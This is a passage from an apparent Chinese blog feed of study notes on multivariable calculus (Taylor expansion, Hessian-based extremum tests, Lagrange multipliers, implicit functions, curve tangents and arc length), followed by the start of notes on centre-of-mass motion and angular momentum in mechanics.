class="math inline">\(\Omega\)</span>内连续，则称<span
class="math inline">\(f\)</span>是定义在<span
class="math inline">\(\Omega\)</span>上的<span
class="math inline">\(C^{(0)}\)</span><strong>类函数</strong>，记为<span
class="math inline">\(f\in C^{(0)}(\Omega)\)</span>，或<span
class="math inline">\(C(\Omega)\)</span>若函数在<span
class="math inline">\(\Omega\)</span>内具有连续的<span
class="math inline">\(m(m\ge 1为正整数)\)</span>阶偏导数，则称<span
class="math inline">\(f\)</span>是<span
class="math inline">\(\Omega\)</span>上的<span
class="math inline">\(C^{(m)}\)</span><strong>类函数</strong>，记作<span
class="math inline">\(f\in C^{(m)}(\Omega)\)</span></p>
<p>​ 设n元函数<span class="math inline">\(f\in C^{(2)}(U(\mathbf
{x_0})),\mathbf{x_0+\Delta x\in U(x_0)}\)</span>，其中<span
class="math inline">\(\mathbf{x_0}=(x_{0.1},x_{0.2},\cdots,x_{0.n}^T\)</span>.则存在<span
class="math inline">\(\theta \in(0,1)\)</span>使得 <span
class="math display">\[
f(\mathbf{x_0+\Delta x})=f(\mathbf{x_0})+\sum _{i=1} ^n \frac{\partial
f(\mathbf {x_0})}{\partial x_i}\mathbf{\Delta x_i}+R_1
\]</span> ​ 其中 <span class="math display">\[
R_1=\frac{1}{2!}\sum _{i=1}^n \sum _{j=1}^{j} \frac{\partial^2f
(\mathbf{x_0+\Delta x)} } {\partial x_i \partial x_j }\mathbf{\Delta x_i
\Delta x_j}
\]</span> ​ 称为Lagrange余项的一阶形式.</p>
<p>​ 上述公式也可写成如下的矩阵形式 <span class="math display">\[
f(\mathbf{x_0+\Delta x})=f(\mathbf{x_0}+\left \langle \nabla f(\mathbf
{x_0} ),\mathbf {\Delta x_0} \right \rangle +\frac{1}{2!}(\mathbf
{\Delta x})^T\mathbf{H_f(x_0+\theta \Delta x)\Delta x}
\]</span> ​ 其中实对称矩阵 <span class="math display">\[
\mathbf{H_f}(\mathbf{x_0+\Delta x})=
\begin{bmatrix}
f_{x_1x_1}(\mathbf x) &amp;f_{x_1x_2}(\mathbf x)  &amp; \cdots  &amp;
f_{x_1x_n}(\mathbf x)\\
f_{x_2x_1}(\mathbf x) &amp; f_{x_2x_2}(\mathbf x) &amp; \cdots
&amp;f_{x_2x_n}(\mathbf x) \\
\vdots &amp; \vdots &amp;  &amp;\vdots \\
f_{x_nx_1}(\mathbf x) &amp; f_{x_nx_2}(\mathbf x)
&amp;\cdots  &amp;f_{x_nx_n}(\mathbf x)
\end{bmatrix} _{\mathbf{x_0+\Delta x}}
\]</span> ​ 是函数<span class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf{x_0+\Delta x}\)</span>的Hesse矩阵</p>
<p>​ 同理可以得到n元函数<span class="math inline">\(f\)</span>在<span
class="math inline">\(\mathbf{x_0}\)</span>处带有Peano余项的Taylo公式</p>
<h1 id="无约束极值最大值与最小值">无约束极值、最大值与最小值</h1>
<h2 id="极值的必要条件">极值的必要条件：</h2>
<p>​ 由一元函数极值的必要条件，必有<span
class="math inline">\(f_x(x_0,y_0)=0\)</span>同理能得到<span
class="math inline">\(f_y(x_0,y_0)=0\)</span>,由梯度计算公式能得到</p>
<p>​ 设n元函数<span class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf{x_0}\)</span>处可微，且<span
class="math inline">\(\mathbf{x_0}\)</span>为<span
class="math inline">\(f\)</span>的极值点，则必有<span
class="math inline">\(\nabla f(\mathbf{x_0)=0}\)</span></p>
<p>​ 我们称满足<span class="math inline">\(\nabla
f(\mathbf{x_0)=0}\)</span>的点为<span
class="math inline">\(f\)</span>的驻点，</p>
<p>​
驻点不一定是极值点，极值点也不一定是驻点（极值点处偏导数不存在），若极值点处存在偏导数，则极值点一定是驻点。</p>
<h2 id="极值的充分条件">极值的充分条件</h2>
<p>​ 设n元函数<span class="math inline">\(f\in C^{(2)}(\Omega),\nabla
f(\mathbf{x_0)=0},\mathbf{H_f}(\mathbf{x_0})\)</span>为<span
class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf{x_0}\)</span>的Hesse矩阵.若<span
class="math inline">\(\mathbf{H_f}(\mathbf{x_0})\)</span>正定（负定），则<span
class="math inline">\(f(\mathbf {x_0})\)</span>为<span
class="math inline">\(f\)</span>的极小值（极大值）.</p>
<p>​ <em>The concept of positive definite matrix can move to <a
href="https://www.sa1ge.ink/post/c0da8988.html">Linear Algebra Notes |
Sa1ge 's Blog</a>)</em></p>
<blockquote>
<p>证明：</p>
<p>​ 因为<span class="math inline">\(\nabla
f(\mathbf{x_0)=0}\)</span>由Talyor公式，有 <span class="math display">\[
f(\mathbf{x_0+\Delta x})-f(\mathbf {x_0})=\frac{1}{2!}(\mathbf {\Delta
x})^T\mathbf{H_f(x_0)\Delta x}+o(\|\mathbf{\Delta x} \|^2)
\]</span> ​ 当<span
class="math inline">\(\mathbf{H_f(x_0)}\)</span>正定时，知<span
class="math inline">\(\mathbf{H_f(x_0)}\)</span>的最小特征值<span
class="math inline">\(\lambda_1&gt;0\)</span>，而且<span
class="math inline">\(\forall \mathbf{\Delta x\neq 0}\)</span>，恒有：
<span class="math display">\[
(\mathbf {\Delta x})^T\mathbf{H_f(x_0)\Delta x} \ge
\lambda_1\|\mathbf{\Delta x}\|^2
\]</span> ​ 于是有： <span class="math display">\[
f(\mathbf{x_0+\Delta x})-f(\mathbf {x_0})\ge
\frac{1}{2}\lambda_1\|\mathbf{\Delta x}\|^2+o(\|\mathbf{\Delta x}
\|^2)=[\frac{1}{2}\lambda_1o(1)]\|\mathbf{\Delta x}\|
\]</span> ​ 其中o(1)是当<span class="math inline">\(\mathbf{\Delta x \to
0}\)</span>时的无穷小量.由上式即知：当<span
class="math inline">\(\mathbf{\Delta x\neq 0}\)</span>且<span
class="math inline">\(\|\mathbf{\Delta x}\|\)</span>充分小时，就有：
<span class="math display">\[
f(\mathbf{x_0+\Delta x})-f(\mathbf {x_0})&gt;0,或f(\mathbf{x_0+\Delta
x})&gt;f(\mathbf {x_0})
\]</span> ​ 这就是说，当<span
class="math inline">\(\mathbf{H_f(x_0)}\)</span>正定时，<span
class="math inline">\(f(\mathbf{x_0})\)</span>为<span
class="math inline">\(f\)</span>的极小值；同理可得，当当负定时，<span
class="math inline">\(f(\mathbf{x_0})\)</span>为<span
class="math inline">\(f\)</span>的极大值</p>
</blockquote>
<p>​ 求<span class="math inline">\(C^{(2)}\)</span>类函数<span
class="math inline">\(f\)</span>的极值的步骤：</p>
<ol type="1">
<li>求出<span class="math inline">\(f\)</span>的所有驻点</li>
<li>求出<span class="math inline">\(f\)</span>在各个驻点的Hesse矩阵</li>
<li>判断Hesse矩阵的类型，确定出<span
class="math inline">\(f\)</span>的极值点</li>
</ol>
<p>​ 当<span
class="math inline">\(\mathbf{H_f(x_0)}\)</span>不定时，因为二次型<span
class="math inline">\((\mathbf{x-x_0})^T\mathbf{H_f}(\mathbf{x-x_0})\)</span>不定，从而在<span
class="math inline">\(\mathbf{x_0}\)</span>的邻域内<span
class="math inline">\([f(\mathbf{x})-f(\mathbf{x_0})]\)</span>不定号，所以<span
class="math inline">\(f(\mathbf{x_0})\)</span>不是极值.</p>
<p>​ 特别地，对于二元函数<span
class="math inline">\(z=f(x,y)\)</span>，若点<span
class="math inline">\(P_0(x_0,y_0)\)</span>为<span
class="math inline">\(f\)</span>的驻点，记 <span class="math display">\[
f_{xx}(P_0)=A,f_{xy}(P_0)=B,f_{yy}(P_0)=C
\]</span> ​ 则<span class="math inline">\(f\)</span>在点<span
class="math inline">\(P_0\)</span>的Hesse矩阵为 <span
class="math display">\[
\mathbf{H_f}(P_0)=\begin{bmatrix}
A &amp;B \\
B &amp;C
\end{bmatrix}
\]</span> ​ 于是根据矩阵判定，有：</p>
<ul>
<li>若<span class="math inline">\(A&gt;0,AC-B^2&gt;0\)</span>则<span
class="math inline">\({H_f}(P_0)\)</span>正定，故<span
class="math inline">\(f(P_0)\)</span>为极小值;</li>
<li>若<span class="math inline">\(A&lt;0,AC-B^2&gt;0\)</span>则<span
class="math inline">\({H_f}(P_0)\)</span>负定，故<span
class="math inline">\(f(P_0)\)</span>为极大值;</li>
<li>若<span class="math inline">\(AC-B^2&lt;0\)</span>则<span
class="math inline">\({H_f}(P_0)\)</span>不定，故<span
class="math inline">\(f(P_0)\)</span>不是极值;</li>
</ul>
<p>​ 当<span
class="math inline">\(AC-B^2=0\)</span>，称为临界情况，这是只根据二阶泰勒公式不能确定点<span
class="math inline">\(P_0\)</span>是否是<span
class="math inline">\(f\)</span>的极值点，需要进一步用极限的定义来讨论</p>
<h2 id="最大值和最小值">最大值和最小值</h2>
<p>​ 可以先求<span class="math inline">\(f\)</span>在<span
class="math inline">\(\Omega\)</span>内部的一切驻点处的函数值、偏导数不存在点处的函数值以及<span
class="math inline">\(f\)</span>在<span
class="math inline">\(\Omega\)</span>边界上的最大值（最小值），这些数中最大（最小）的一个便是所求的最大（最小）值.</p>
<h2 id="有约束极值lagrange乘数法">有约束极值，Lagrange乘数法</h2>
<p>​
附有约束条件的极值问题，称为<strong>有约束极值问题</strong>（或条件极值问题）</p>
<p>​
某些情形下，这种有约束极值问题可以化为无约束极值问题来求解，但并不一般适用</p>
<h3 id="lagrange乘数法">Lagrange乘数法</h3>
<p>​ 设目标函数 <span class="math display">\[
z=f(x,y)
\]</span> ​ 在约束条件 <span class="math display">\[
\varphi(x,y)=0
\]</span> ​ 下取得极值，且<span
class="math inline">\((x_0,y_0)\)</span>为其极值点，并设<span
class="math inline">\(f,\varphi\in C ^{(1)}(U(x_0,y_0))\)</span>且<span
class="math inline">\(\varphi_y(x_0,y_0)\neq 0\)</span>，于是有 <span
class="math display">\[
\varphi(x_0,y_0)=0
\]</span> ​ 且由隐函数存在定理可知，方程<span
class="math inline">\(\varphi(x,y)=0\)</span>确定了一可导函数<span
class="math inline">\(y=y(x)\)</span>，它满足<span
class="math inline">\(\varphi[x,y(x)]\equiv 0\)</span>且<span
class="math inline">\(y_0=y(x_0)\)</span>，把它代入目标函数得： <span
class="math display">\[
z=f[x,y(x)]
\]</span> ​ 这样将有约束极值问题化为了一元函数的无约束极值问题，而<span
class="math inline">\(x=x_0\)</span>就是函数的极值点，由一元可导函数取得极值的必要条件可知：
<span class="math display">\[
\frac{dz}{dx}\bigg
|_{x=x_0}=f_x(x_0,y_0)+f_y(x_0,y_0)\frac{dy}{dx}\bigg|_{x=x_0}=0
\]</span> ​ 对<span
class="math inline">\(\varphi(x,y)=0\)</span>运用隐函数求导法则，得：
<span class="math display">\[
\frac{dy}{dx}\bigg|_{x=x_0}=-\frac{\partial_x(x_0,y_0)}{\partial_y(x_0,y_0)}
\]</span> ​ 代入<span class="math inline">\(\frac{dz}{dx}\bigg
|_{x=x_0}=f_x(x_0,y_0)+f_y(x_0,y_0)\frac{dy}{dx}\bigg|_{x=x_0}=0\)</span>得：
<span class="math display">\[
f_x(x_0,y_0)-f_y(x_0,y_0)\frac{\partial_x(x_0,y_0)}{\partial_y(x_0,y_0)}=0
\]</span> ​ 于是 <span class="math display">\[
\varphi(x_0,y_0)=0\varphi(x_0,y_0)=0
\]</span></p>
<p><span class="math display">\[
f_x(x_0,y_0)-f_y(x_0,y_0)\frac{\partial_x(x_0,y_0)}{\partial_y(x_0,y_0)}=0
\]</span></p>
<p>​ 两式就是所求有约束极值的必要条件.从此两式解出的<span
class="math inline">\((x_0,y_0)\)</span>就可能是所求有约束极值的极值点（<strong>条件极值点</strong>）</p>
<p>​ 用行列式写成 <span class="math display">\[
\begin{vmatrix}
f_x(x_0,y_0) &amp;f_y(x_0,y_0) \\
\varphi_x(x_0,y_0) &amp; \varphi_y(x_0,y_0)
\end{vmatrix}=0
\]</span> ​</p>
<p>​ 由行列式的性质知，其两行对应成比例，令此比例系数为<span
class="math inline">\(-\lambda_0\)</span>，于是得到： <span
class="math display">\[
\begin{cases}
f_x(x_0,y_0)+\lambda_0\varphi_x(x_0,y_0)=0\\
f_y(x_0,y_0)+\lambda_0\varphi_y(x_0,y_0)=0\\
\varphi(x_0,y_0)=0
\end{cases}
\]</span> ​ 容易看出，上式就是三元函数 <span class="math display">\[
L(x,y,\lambda)=f(x,y)+\lambda\varphi(x,y)
\]</span> ​ 在<span
class="math inline">\((x_0,y_0,\lambda_0)\)</span>取得无约束极值的必要条件.</p>
<p>​ 所以要求目标函数在约束条件下的有<strong>约束极值点</strong><span
class="math inline">\((x_0,y_0)\)</span>，可先构成函数<span
class="math inline">\(L(x,y,\lambda)=f(x,y)+\lambda\varphi(x,y)\)</span>，然后令它的三个偏导数为零得：
<span class="math display">\[
\begin{cases}
L_x(x,y,\lambda)=f_x(x,y)+\lambda\varphi_x(x,y)=0\\
L_x(x,y,\lambda)=f_y(x,y)+\lambda\varphi_y(x,y)=0\\
L_\lambda(x,y,\lambda)=\varphi_(x,y)=0
\end{cases}
\]</span> ​ 再从这三个方程中解出<span
class="math inline">\(x_0,y_0,\lambda\)</span>，则其中的点<span
class="math inline">\((x_0,y_0)\)</span>就可能是所求的有约束极值点</p>
<p>​ 函数<span
class="math inline">\(L(x,y,\lambda)=f(x,y)+\lambda\varphi(x,y)\)</span>称为<strong>Lagrange函数</strong>，数<span
class="math inline">\(\lambda\)</span>称为<strong>Lagrange乘数</strong>，这种求有约束极值点的必要条件的方法称为<strong>Lagrange乘数法</strong>，<span
class="math inline">\((x_0,y_0,\lambda_0)\)</span>就是Lagrange函数L的驻点.</p>
<p>​ 方程组也可写成向量形式： <span class="math display">\[
\begin{cases}
\nabla f(P)=-\lambda\nabla\varphi(P)\\
\varphi(P)=
\end{cases}
\]</span> ​ 其中<span class="math inline">\(\nabla
f=(f_x,f_y)\)</span>是函数<span
class="math inline">\(f\)</span>的梯度，<span
class="math inline">\(\nabla \varphi\)</span>是<span
class="math inline">\(\varphi\)</span>的梯度. ​
当约束条件有多个时，需要构造的Lagrange函数是 <span
class="math display">\[
L(x_1,\cdots,x_n,\lambda_1,\cdots,\lambda_m)=f(x_1,\cdots,x_n)+\sum
_{k=1} ^m \lambda_k\varphi_k(x_1,\cdots,x_n)
\]</span></p>
<h1 id="隐函数的求导公式">隐函数的求导公式</h1>
<p>​ 一个方程确定的隐函数已在上文给出<a
href="#隐函数微分法determined-by-1-equation">隐函数微分法</a></p>
<p>​ 由m个m+n元方程组成的方程组 <span class="math display">\[
\begin{cases}
F_1(x_1,\cdots,x_n,y_1,\cdots,y_m)=0,\\
F_2(x_1,\cdots,x_n,y_1,\cdots,y_m)=0,\\
\cdots\cdots\\
F_n(x_1,\cdots,x_n,y_1,\cdots,y_m)=0,\\
\end{cases}
\]</span> ​ 对于给定的<span
class="math inline">\(x_1,\cdots,x_n\)</span>，上式就是包含m个方程、m+n个变量的方程组.如果存在定义在点集<span
class="math inline">\(A\subseteq R^n\)</span>上的m个函数 <span
class="math display">\[
y_i=f_i(x_1,\cdots,x_n),i=1,2,\cdots,m
\]</span> ​
使得其代入方程组后变成m个恒等式，那么就称m个函数是它的解，或称由该方程组所确定的隐函数</p>
<pre><code>### 隐函数存在定理</code></pre>
<p>​ 设有函数方程组 <span class="math display">\[
\begin{cases}
F_1(x,y,u,v)=0\\
F_2(x,y,u,v)=0
\end{cases}
\]</span> ​ 如果函数<span class="math inline">\(F_1,F_2\)</span>满足</p>
<ol type="1">
<li><p><span class="math inline">\(F_i\in
C^{(1)}(U(x_0,y_0,u_0,v_0)),i=1,2\)</span></p></li>
<li><p><span
class="math inline">\(F_i(x_0,y_0,u_0,v_0)=0,i=1,2\)</span></p></li>
<li><p>Jacobi行列式 <span class="math display">\[
J=\frac{\partial (F_1,F_2)}{\partial (u,v)}\bigg
|_{(x_0,y_0,u_0,v_0)}=\begin{vmatrix}
\frac{\partial F_1}{\partial u}  &amp;\frac{\partial F_1}{\partial v} \\
\frac{\partial F_2}{\partial u} &amp;\frac{\partial F_2}{\partial v}
\end{vmatrix}
\neq0
\]</span></p></li>
</ol>
<p>​ 则在点<span class="math inline">\((x_0,y_0,u_0,v_0)\in
R^4\)</span>的某邻域<span
class="math inline">\(U(x_0,y_0,u_0,v_0)\)</span>内由方程组唯一确定了两个单值且有连续偏导数的二元函数
<span class="math display">\[
u=u(x,y),v=v(x,y)
\]</span> ​ 它满足 <span class="math display">\[
u_0=u(x_0,y_0),v_0=v(x_0,y_0)
\]</span> ​ 及 <span class="math display">\[
F_i(x,y,(x,y),v(x,y))\equiv 0,u=1,2,(x,y)\in U((x_0,y_0))
\]</span> ​ 对隐函数的导数公式的推导：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/f59dbd741f8c1d6bce0b771054782bc.jpg" /></p>
<p>​ 例题：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230420235353397.png" /></p>
<h1 id="几何学应用">几何学应用</h1>
<h2 id="空间曲线的切线与切面">空间曲线的切线与切面</h2>
<h3 id="空间曲线的切线与法平面">空间曲线的切线与法平面</h3>
<p>​ 设空间简单曲线<span class="math inline">\(\Gamma\)</span>的方程为
<span class="math display">\[
\mathbf {r=r(t)}=(x(t),y(t),z(t))\space \space (\alpha \le t \le \beta)
\]</span> ​ 其中向量值函数<span class="math inline">\(\mathbf
r(t)\)</span>在<span
class="math inline">\([\alpha,\beta]\)</span>上可导，其导数记作<span
class="math inline">\(\mathbf{\dot{r(t)}
}=(\dot{x(t)},\dot{y(t)},\dot{z(t)})\neq \mathbf 0 \space \space (\alpha
\le t\le \beta)\)</span></p>
<p>​ 向径<span class="math inline">\(\mathbf{r(t)}\)</span>的导数<span
class="math inline">\(\mathbf{\dot{r(t)} }\)</span>是<span
class="math inline">\(\Gamma\)</span>在点<span
class="math inline">\(P_0\)</span>的切线的一个方向向量，而且它的方向与<span
class="math inline">\(\Gamma\)</span>的正方向一致，称它为<span
class="math inline">\(\Gamma\)</span>在点<span
class="math inline">\(P_0\)</span>的<strong>切向量</strong>.</p>
<p>​ 曲线<span class="math inline">\(\Gamma\)</span>在<span
class="math inline">\(P_0(\mathbf r(t_0))\)</span>处切线的向量方程写为
<span class="math display">\[
\mathbf \rho =\mathbf{r(t_0)}+t\dot{\mathbf r}(t_0)
\]</span> ​ 其中<span class="math inline">\(\mathbf
\rho=(x,y,z)\)</span>为切线上动点<span
class="math inline">\(P(x,y,z)\)</span>的向径，<span
class="math inline">\(t\in
R\)</span>为参数，消去参数t，即得该切线的对称式方程 <span
class="math display">\[
\frac{x-x(t_0)}{\dot{x}(t_0)}=\frac{y-y(t_0)}{\dot{y}(t_0)}=\frac{z-z(t_0)}{\dot{z}(t_0)}
\]</span> ​ 过曲线<span class="math inline">\(\Gamma\)</span>上的点<span
class="math inline">\(P_0\)</span>且与点<span
class="math inline">\(P_0\)</span>处的切线垂直的任一直线称为此曲线<span
class="math inline">\(\Gamma\)</span>在点<span
class="math inline">\(P_0\)</span>的法线，这些法线位于的同一平面称为<span
class="math inline">\(\Gamma\)</span>在点<span
class="math inline">\(P_0\)</span>的法平面.</p>
<p>​ 显然<span class="math inline">\(\dot{\mathbf
r(t_0)}\)</span>是法平面的一个法线向量，于是法平面的方程是 <span
class="math display">\[
\dot{\mathbf r(t_0)}\cdot[\mathbf \rho -\mathbf r(t_0)]=0
\]</span> ​ 或 <span class="math display">\[
\dot{x(t_0)}[x-x(t_0)]+\dot{y(t_0)}[y-y(t_0)]+\dot{z(t_0)}[z-z(t_0)]=0
\]</span> ​ 其中<span class="math inline">\(\mathbf \rho
=(x,y,z)\)</span>是法平面上点<span
class="math inline">\((x,y,z)\)</span>的向径.</p>
<p>​ 如果曲线<span
class="math inline">\(\Gamma\)</span>是由两柱面的交线给出，设它的方程为
<span class="math display">\[
y=y(x),z=z(x)\space (a \le x \le b)
\]</span> ​ 把x看作是参数，得出 <span class="math display">\[
x=x,y=y(x),z=z(x)\space (a \le x \le b)
\]</span> ​ 那么<span class="math inline">\(\Gamma\)</span>上与参数<span
class="math inline">\(x=x_0\)</span>相对应的点的切线方程是 <span
class="math display">\[
\frac{x-x(t_0)}{1}=\frac{y-y(t_0)}{\dot{y}(t_0)}=\frac{z-z(t_0)}{\dot{z}(t_0)}
\]</span> ​ 法平面方程： <span class="math display">\[
x-x(t_0)+\dot{y(t_0)}[y-y(t_0)]+\dot{z(t_0)}[z-z(t_0)]=0
\]</span> ​ 如果曲线<span
class="math inline">\(\Gamma\)</span>的方程由一般式方程 <span
class="math display">\[
\begin{cases}
F(x,y,z)=0\\
G(x,y,z)=0
\end{cases}
\]</span> ​ 给出，且在点<span
class="math inline">\(P(x_0,y_0,z_0)\)</span>的某邻域内方程组满足隐函数存在定理的条件，不妨设
<span class="math display">\[
\frac{\partial(F,G)}{\partial(y,z)}\bigg |_{P_0}\neq 0
\]</span> ​ 那么在点<span
class="math inline">\(P_0\)</span>的某邻域内由方程组确定两个具有连续导数的一元隐函数<span
class="math inline">\(y=y(x),z=z(x)\)</span>.由隐函数求导法求出<span
class="math inline">\(\dot{y(x)}\)</span>和<span
class="math inline">\(\dot{z(x)}\)</span>之后，再代入方程组，得到曲线的切线方程和法平面方程</p>
<h2 id="弧长">弧长</h2>
<p>​ 定义：设简单曲线<span class="math inline">\(\Gamma\)</span>的方程是
<span class="math display">\[
\mathbf{r=r(t)}=(x(t),y(t),z(t))\space \space (\alpha \le t\le \beta)
\]</span> ​ <span
class="math inline">\(\Gamma\)</span>的两个端点A，B分别对应于向径<span
class="math inline">\(\mathbf{r(\alpha)},\mathbf{r(\beta)}\)</span>，在<span
class="math inline">\(\Gamma\)</span>上介于A和B之间沿着参数t增大的方向依次去n-1个分点<span
class="math inline">\(P_1,P_2,\cdots,P_{n-1}\)</span>，它们把<span
class="math inline">\(\Gamma\)</span>分为了n段，用直线段把相邻分点连结起来，即得到一折线，它的长度是
<span class="math display">\[
s_n=\sum _{i=1} ^n \| \overrightarrow {P_{i-1}P_i}\|
\]</span> ​ 其中<span
class="math inline">\(A=P_0,B=P_N\)</span>.如果不管分点如何选取，当<span
class="math inline">\(d=max\|\overrightarrow {P_{i-1}P_i}\|\to
0\)</span>时，折线的长度<span
class="math inline">\(s_n\)</span>有确认的极限<span
class="math inline">\(s\)</span>，则称<span
class="math inline">\(\Gamma\)</span>为可求长的曲线，且这个极限值<span
class="math inline">\(s\)</span>为<span
class="math inline">\(\Gamma\)</span>的长度，或<span
class="math inline">\(\Gamma\)</span>的弧长，即 <span
class="math display">\[
s=\lim _{d\to 0}\sum _{i=1} ^n \|\overrightarrow {P_{i-1}P_i}\|
\]</span> ​ 弧长的计算公式：</p>
<p>​ 设在<span class="math inline">\([\alpha,\beta]\)</span>上<span
class="math inline">\(\dot{\mathbf r}(t)\)</span>连续且<span
class="math inline">\(\dot{\mathbf r}(t)\neq \mathbf
0\)</span>，则曲线<span class="math inline">\(\mathbf r=\mathbf
r(t)\space (\alpha \le t\le \beta)\)</span>是可求长的曲线，且<span
class="math inline">\(\Gamma\)</span>的长度为 <span
class="math display">\[
s=\int _\alpha ^\beta \|\dot{\mathbf {r} }(t)dt=\int _\alpha ^\beta
\sqrt{[\dot{x}(t)]^2+\dot{y}(t)]^2+\dot{z}(t)]^2}dt
\]</span> ​ 对于平面曲线<span
class="math inline">\(\Gamma:x=x(t),y=y(t)(\alpha \le t\le
\beta)\)</span>，其弧长为： <span class="math display">\[
s=\int _\alpha ^\beta \sqrt{ [\dot{x}(t)]^2+\dot{y}(t) ]^2 } dt
\]</span> ​ 从而有：</p>
<ul>
<li><p>若平面曲线<span
class="math inline">\(\Gamma\)</span>在直角坐标系下的方程为： <span
class="math display">\[
y=y(x) (a\le x\le b)
\]</span> ​ 则<span class="math inline">\(\Gamma\)</span>有参数方程<span
class="math inline">\(x=x,y=y(x)(a\le x\le b)\)</span>，因而<span
class="math inline">\(\Gamma\)</span>的弧长为 <span
class="math display">\[
s=\int _a ^b \sqrt{1+[y&#39;(x)]^2}dx
\]</span></p></li>
<li><p>若平面曲线<span
class="math inline">\(\Gamma\)</span>在极坐标下的方程是 <span
class="math display">\[
\rho=\rho(\theta) (\alpha\le \theta\le \beta)
\]</span> ​ 则<span class="math inline">\(\Gamma\)</span>有参数方程<span
class="math inline">\(x=\rho(\theta)\cos \theta,y=x=\rho(\theta)\sin
\theta\space (\alpha \le \theta \le \beta)\)</span>.于是<span
class="math inline">\(\Gamma\)</span>的弧长为 <span
class="math display">\[
s=\int _\alpha ^\beta
\sqrt{[x&#39;(\theta)]^2+[y&#39;(\theta)]^2}d\theta=\int _\alpha ^\beta
\sqrt{[\rho(\theta)]^2+[\rho&#39;(\theta)]^2}d\theta
\]</span> ​</p>
<p>## 弧微分</p></li>
</ul>
<p>​ 我们称 <span class="math display">\[
ds=\|\dot{\mathbf{r}}(t)\|=\sqrt{[\dot{x}(t)]^2+\dot{y}(t)]^2+\dot{z}(t)]^2}dt
\]</span> ​ 为弧长<span
class="math inline">\(s(t)\)</span>的微分，简称弧微分.</p>
<p>​ 由于<span
class="math inline">\(\frac{ds}{dt}=\|\dot{\mathbf{r}}(t)\|&gt;0\)</span>，故<span
class="math inline">\(s=s(t)\)</span>存在反函数<span
class="math inline">\(t=t(s)\)</span>，将它代入<span
class="math inline">\(\Gamma\)</span>的参数方程<span
class="math inline">\(\mathbf{r=r}(t)\)</span>，便得到<span
class="math inline">\(\Gamma\)</span>​以弧长s为参数的方程 <span
class="math display">\[
\mathbf{r=r}(t(s)) \space (a\le s\le b)
\]</span> ​ 称<span class="math inline">\(s\)</span>为曲线<span
class="math inline">\(\Gamma\)</span>的<strong>自然参数</strong>,其中<span
class="math inline">\([a,b]\)</span>为函数<span
class="math inline">\(s=s(t)\space (\alpha \le t\le
\beta)\)</span>的值域</p>
<p>​</p>
]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>Review</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>大雾的一点</title>
    <url>/archives/a5d49d08.html</url>
    <content><![CDATA[<h1 id="动力学">动力学</h1>
<h2 id="质心运动定理">质心运动定理</h2>
<p>​ 将质心位矢<span
class="math inline">\(\mathbf{r_c}=\frac{\sum(m_i\mathbf{r_i})}{m}\)</span>,对时间求导得到质心运动的速度
<span class="math display">\[
\mathbf{v_c}=\frac{d\mathbf{r_c}}{dt}=\frac{1}{m}\sum(m_i\mathbf{v_i})
\]</span> ​ 可以得到 <span class="math display">\[
m\mathbf{v_c}=\sum(m_i\mathbf{v_i})
\]</span> ​ 质点的动量等于该质点系的质量与质心速度的乘积，即 <span
class="math display">\[
\mathbf{p}=m\mathbf{v_c}
\]</span> ​
质点系的总动量<strong>p</strong>的时间变化率即为该质点系所收到的合外力<strong>F</strong>
<span class="math display">\[
\mathbf{F}=\frac{d\mathbf{p}}{dt}=m\frac{d\mathbf{v_c}}{dt}
\]</span> ​ 式中<span
class="math inline">\(\frac{d\mathbf{v_c}}{dt}\)</span>为质心加速度，以<span
class="math inline">\(\mathbf{a_c}\)</span>表示，则有 <span
class="math display">\[
\mathbf{F}=\frac{d\mathbf{p}}{dt}=m\mathbf{a_c}
\]</span> ​
质点系的质量与其质心加速度的乘积等于该<strong>质点系所受到的合外力</strong></p>
<span id="more"></span>
<h2 id="角动量">角动量</h2>
<p>​ 以某固定点为参考点，位矢<strong>r</strong></p>
<p>​
定义：设质点质量为m，速度为<strong>v</strong>，动量<strong>p</strong>=m<strong>v</strong>，相对于固定参考点O的位矢为<strong>r</strong>.质点对O点的位矢与其动量的矢积为质点对O点的角动量<strong>L</strong>，即
<span class="math display">\[
\mathbf{L}=\mathbf{r}\times m\mathbf{v}
\]</span> ​
角动量是矢量，垂直于<strong>r</strong>和<strong>p</strong>所组成的平面，其指向右手螺旋法则来确定。</p>
<h3 id="角动量定理">角动量定理</h3>
<p>​ 将<span class="math inline">\(\mathbf{L}=\mathbf{r}\times
m\mathbf{v}\)</span>对时间求导 <span class="math display">\[
\frac{\mathrm{d\mathbf{L} } }{\mathrm{d} t}= \frac{\mathrm{d }
}{\mathrm{d}t}(\mathbf{r}\times m\mathbf{v})=\mathbf{r}\times
\frac{\mathrm{d}( m\mathbf{v})}{\mathrm{d} t} +\frac{d\mathbf{r}
}{dt}\times m\mathbf{v}
\]</span></p>
<p><span class="math display">\[
\frac{\mathrm{d\mathbf{L} } }{\mathrm{d} t}= \mathbf{r}\times
\mathbf{F}+\mathbf{v}\times(m\mathbf{v})
\]</span></p>
<p>​ 而 <span class="math display">\[
\mathbf{v}\times m\mathbf{v}=0  
\]</span> ​ 所以 <span class="math display">\[
\frac{\mathrm{d\mathbf{L} } }{\mathrm{d} t}= \mathbf{r}\times \mathbf{F}
\]</span> ​
我们定义力的作用点相对参考点的位矢<strong>r</strong>与力<strong>F</strong>的矢积为力对参考点的力矩，以<strong>M</strong>表示，即有
<span class="math display">\[
\mathbf{M}=\mathbf{r}\times \mathbf{F}
\]</span> ​ 微分形式下则有： <span class="math display">\[
\mathbf{M}=\frac{d\mathbf{L}}{dt}
\]</span> ​
即作用在质点上的合力对任意固定点O的<strong>力矩</strong>等于质点对同一点的<strong>角动量的时间变化率</strong></p>
<p>​ 此即质点的角动量定理，可以改写为 <span class="math display">\[
\mathbf{M}dt=d\mathbf{L}
\]</span> ​ 上式为质点的角动量定理的微分式，对上式积分得到： <span
class="math display">\[
\int_{t_1}^{t_2}\mathbf{M}dt=\mathbf{L_2}-\mathbf{L_1}
\]</span> ​ 力矩对时间的积分<span
class="math inline">\(\int_{t_1}^{t_2}\mathbf{M}dt\)</span>称为冲量矩。</p>
<p>​
上式表示：作用在质点上所有力的合力在某段时间内的冲量矩等于质点在同一时间内角动量的增量</p>
<p>​
